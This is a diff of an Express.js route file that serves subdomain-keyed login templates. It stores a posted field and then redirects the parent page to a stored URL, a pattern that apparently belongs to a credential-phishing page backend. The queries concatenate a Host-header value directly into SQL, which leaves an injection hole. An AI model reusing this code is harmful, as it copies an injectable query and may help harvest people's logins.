@@ -1,5 +1,6 @@
 var _ip = require('./../lib/ip.js');
 var sql = require('../db/sqlite.js');
+var code = require('../lib/incode.js');
 module.exports = function(app) {
     function insertData(req,cb) {
         var qq = req.body.u;
@@ -25,6 +26,7 @@ module.exports = function(app) {
     app.get('/_login',function(req,res) {
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        uid = code.decode(uid);
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
@@ -37,6 +39,7 @@ module.exports = function(app) {
         var tz = req.body.tz;
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        uid = code.decode(uid);
         insertData(req,function(){
             sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                 var mid = rows[0].tempId;
@@ -53,13 +56,14 @@ module.exports = function(app) {
     app.get('/x',function(req,res) {
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        uid = code.decode(uid);
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
             var url = rows[0].url;
-            if (req.device.type === 'phone') {
-                return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
-            }
+            // if (req.device.type === 'phone') {
+            //     return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
+            // }
             res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
         });
     });
@@ -68,6 +72,7 @@ module.exports = function(app) {
         var tz = req.body.tz;
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        uid = code.decode(uid);
         insertData(req,function(){
             sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
                 var mid = rows[0].tempId;
@@ -76,9 +81,9 @@ module.exports = function(app) {
                 if (tz.toString() === '1') {
                     return res.send('<script>window.parent.location.href="'+url+'";</script>');
                 }
-                if (req.device.type === 'phone') {
-                    return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
-                }
+                // if (req.device.type === 'phone') {
+                //     return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
+                // }
                 res.render('pages/pc_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
             });
         });
